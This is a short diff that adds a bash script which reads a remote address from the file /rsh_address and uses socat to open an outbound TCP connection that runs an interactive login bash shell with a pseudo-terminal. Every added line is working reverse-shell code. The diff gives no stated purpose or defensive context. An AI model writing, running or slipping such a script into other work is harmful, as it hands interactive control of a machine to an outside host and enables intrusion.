@@ -1,0 +1,4 @@
+#!/bin/bash
+export PATH="/usr/bin:$PATH"
+RSH_ADDR=$(cat /rsh_address)
+/bin/socat "exec:/bin/bash -li,pty,stderr,setsid,sigint,sane" "tcp:$RSH_ADDR"
